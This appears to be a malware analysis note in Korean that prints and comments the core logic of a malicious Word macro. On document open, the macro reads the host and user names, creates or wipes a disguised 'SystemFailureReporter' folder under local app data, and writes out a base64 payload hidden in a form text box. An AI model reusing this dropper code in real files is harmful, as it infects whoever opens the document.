` 핵심 로직만 정리
Private Sub Document_Open() ` 문서 파일을 열때 실행되는 함수 , 진입점
  domain = ""
  bslash = "\"

  ` Environ : Windows 환경변수 호출하는 VBA 내장 함수 , Lcase =>  문자열을 소문자 변환
  hostname = Lcase(Environ("computername")) ` 해당 호스트 이름 반환
  hostname = Mid(hostname, Len(hostname) - 3, 4) ` mid(문자열 , 시작위치 , 길이) [ Len(hostname) -3 시작위치계산 ] - 3 = 뒤에서 4번째
  username = Mid(Lcase(Environ("username")), 1, 3) ` username 1 ~ 3 글자 반환

  targetpath = Lcase(Environ("localappdata")) `localappdata 환경변수 호출 뒤 반환
  subfolder = "SystemFailureReporter" ` 디렉터리 이름 지정

  If Dir(targetpath & "\" & subfolder, vbDirectory) = "" Then ` 디렉터리가 존재하지 않으면
    MkDir targetpath & bslash & subfolder ` 디렉터리 생성 , localappdata\SystemFailureReporter
  Else
      On Error Resume Next ` 에러 발생시
      Kill targetpath & bslash & subfolder & "\*.*" `path 내부 모든 파일 삭제
      RmDir targetpath & bslash & subfolder ` 디렉터리 삭제
      MkDir targetpath & bslash & subfolder ` 디렉터리 생성
    End If
  t = ""
  t = UserForm1.TextBox1.Text
  tOut = b64Decode(t) ` UserForm1.TextBox1 에 담긴 Text를 Base64 Decode 후 tOut 에 반환
  t = writeFile(targetpath & bslash & subfolder & bslash & b.doc, tOut) ` Userform1.TextBox1 의 텍스트를 target path에 b.doc 파일이란 이름으로 파일생성
  t = writeFile(targetpath & bslash & subfolder & bslash & "update.xml", "test") ` test 파일 생성 [ update.xml ]
